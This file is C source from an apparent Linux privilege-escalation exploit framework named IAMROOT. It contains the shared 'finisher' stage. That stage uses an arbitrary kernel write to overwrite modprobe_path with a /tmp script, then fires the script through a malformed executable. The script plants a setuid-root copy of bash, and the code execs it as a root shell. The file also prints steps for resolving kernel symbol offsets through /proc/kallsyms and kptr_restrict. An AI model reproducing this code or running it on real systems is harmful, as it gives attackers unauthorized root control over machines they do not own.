/*
 * IAMROOT — shared finisher helpers
 *
 * See finisher.h for the pattern split (A: modprobe_path overwrite,
 * B: current->cred->uid).
 */

#include "finisher.h"
#include "module.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/wait.h>

static int write_file(const char *path, const char *content, mode_t mode)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (fd < 0) return -1;
    size_t n = strlen(content);
    ssize_t w = write(fd, content, n);
    close(fd);
    if (w < 0 || (size_t)w != n) return -1;
    if (chmod(path, mode) < 0) return -1;
    return 0;
}

void iamroot_finisher_print_offset_help(const char *module_name)
{
    fprintf(stderr,
"[i] %s --full-chain requires kernel symbol offsets that couldn't be resolved.\n"
"\n"
"    To populate them on this host, choose ONE of:\n"
"\n"
"    1) Environment override (one-shot, no host changes):\n"
"         IAMROOT_MODPROBE_PATH=0x...  iamroot --exploit %s --i-know --full-chain\n"
"\n"
"    2) Make /boot/System.map-$(uname -r) world-readable (per-host):\n"
"         sudo chmod 0644 /boot/System.map-$(uname -r)   # if you have sudo\n"
"\n"
"    3) Lower kptr_restrict (per-boot):\n"
"         sudo sysctl kernel.kptr_restrict=0             # if you have sudo\n"
"         (Note: needs root once — defeats the LPE point on this host.\n"
"          Useful when populating offsets on a lab kernel ahead of time.)\n"
"\n"
"    To look up the address manually (as root):\n"
"         grep -E ' (modprobe_path|init_task|_text)$' /proc/kallsyms\n"
"\n",
        module_name, module_name);
}

int iamroot_finisher_modprobe_path(const struct iamroot_kernel_offsets *off,
                                   iamroot_arb_write_fn arb_write,
                                   void *arb_ctx,
                                   bool spawn_shell)
{
    if (!iamroot_offsets_have_modprobe_path(off)) {
        iamroot_finisher_print_offset_help("module");
        return IAMROOT_EXPLOIT_FAIL;
    }
    if (!arb_write) {
        fprintf(stderr, "[-] finisher: no arb-write primitive supplied\n");
        return IAMROOT_TEST_ERROR;
    }

    /* Per-pid working paths so concurrent runs don't collide. */
    pid_t pid = getpid();
    char mp_path[64], trig_path[64], pwn_path[64];
    snprintf(mp_path,   sizeof mp_path,   "/tmp/iamroot-mp-%d.sh", (int)pid);
    snprintf(trig_path, sizeof trig_path, "/tmp/iamroot-trig-%d", (int)pid);
    snprintf(pwn_path,  sizeof pwn_path,  "/tmp/iamroot-pwn-%d",  (int)pid);

    /* Payload: chmod /bin/bash setuid root + drop a sentinel so we
     * know it ran. Bash 4+ refuses to use its own setuid bit by
     * default — so instead copy bash to /tmp and chmod +s the copy. */
    char payload[1024];
    snprintf(payload, sizeof payload,
"#!/bin/sh\n"
"# IAMROOT modprobe_path payload (runs as init/root via call_modprobe)\n"
"cp /bin/bash %s 2>/dev/null && chmod 4755 %s 2>/dev/null\n"
"echo IAMROOT_FINISHER_RAN > %s 2>/dev/null\n",
        pwn_path, pwn_path, pwn_path);

    if (write_file(mp_path, payload, 0755) < 0) {
        fprintf(stderr, "[-] finisher: write %s: %s\n", mp_path, strerror(errno));
        return IAMROOT_TEST_ERROR;
    }

    /* Unknown-format trigger: anything that fails the standard exec
     * format probe drives kernel's call_modprobe(). Empty + executable
     * works on every kernel we care about. */
    if (write_file(trig_path, "\x00", 0755) < 0) {
        fprintf(stderr, "[-] finisher: write %s: %s\n", trig_path, strerror(errno));
        unlink(mp_path);
        return IAMROOT_TEST_ERROR;
    }

    /* Build the kernel-side write payload: a NUL-terminated path to
     * our mp_path script. modprobe_path[] is 256 bytes in the kernel
     * — we write enough to overwrite the leading slot. */
    char kbuf[256];
    memset(kbuf, 0, sizeof kbuf);
    snprintf(kbuf, sizeof kbuf, "%s", mp_path);

    fprintf(stderr, "[*] finisher: writing modprobe_path=0x%lx ← \"%s\"\n",
            (unsigned long)off->modprobe_path, mp_path);

    if (arb_write(off->modprobe_path, kbuf, strlen(kbuf) + 1, arb_ctx) < 0) {
        fprintf(stderr, "[-] finisher: arb_write failed\n");
        unlink(mp_path);
        unlink(trig_path);
        return IAMROOT_EXPLOIT_FAIL;
    }

    /* Fire the trigger by exec'ing the unknown binary. fork() so the
     * kernel sees the unknown format and parent stays alive. */
    pid_t cpid = fork();
    if (cpid == 0) {
        char *argv[] = { trig_path, NULL };
        execve(trig_path, argv, NULL);
        _exit(127);   /* execve failure is expected — kernel still calls modprobe */
    } else if (cpid > 0) {
        int st;
        waitpid(cpid, &st, 0);
    } else {
        fprintf(stderr, "[-] finisher: fork: %s\n", strerror(errno));
        return IAMROOT_EXPLOIT_FAIL;
    }

    /* Modprobe runs asynchronously — give the kernel up to 3 s. */
    for (int i = 0; i < 30; i++) {
        struct stat st;
        if (stat(pwn_path, &st) == 0 && (st.st_mode & S_ISUID)) {
            fprintf(stderr, "[+] finisher: payload ran as root (sentinel %s mode=%o uid=%u)\n",
                    pwn_path, (unsigned)(st.st_mode & 07777), (unsigned)st.st_uid);
            goto have_setuid;
        }
        struct timespec ts = { 0, 100 * 1000 * 1000 };  /* 100 ms */
        nanosleep(&ts, NULL);
    }
    fprintf(stderr, "[-] finisher: payload didn't run within 3s (modprobe_path overwrite probably didn't land)\n");
    unlink(mp_path);
    unlink(trig_path);
    return IAMROOT_EXPLOIT_FAIL;

have_setuid:
    if (!spawn_shell) {
        fprintf(stderr, "[+] finisher: --no-shell — leaving setuid bash at %s\n", pwn_path);
        unlink(mp_path);
        unlink(trig_path);
        return IAMROOT_EXPLOIT_OK;
    }
    fprintf(stderr, "[+] finisher: spawning root shell via %s -p\n", pwn_path);
    fflush(stderr);
    char *argv[] = { pwn_path, "-p", NULL };
    execve(pwn_path, argv, NULL);
    /* Only reached on execve failure. */
    fprintf(stderr, "[-] finisher: execve(%s): %s\n", pwn_path, strerror(errno));
    return IAMROOT_EXPLOIT_FAIL;
}

int iamroot_finisher_cred_uid_zero(const struct iamroot_kernel_offsets *off,
                                   iamroot_arb_write_fn arb_write,
                                   void *arb_ctx,
                                   bool spawn_shell)
{
    (void)off; (void)arb_write; (void)arb_ctx; (void)spawn_shell;
    fprintf(stderr,
"[-] finisher: cred_uid_zero requires an arb-READ primitive (to walk\n"
"    the task list from init_task and find current). Modules with\n"
"    only an arb-write should use iamroot_finisher_modprobe_path()\n"
"    instead — same root capability, simpler trigger.\n");
    return IAMROOT_EXPLOIT_FAIL;
}
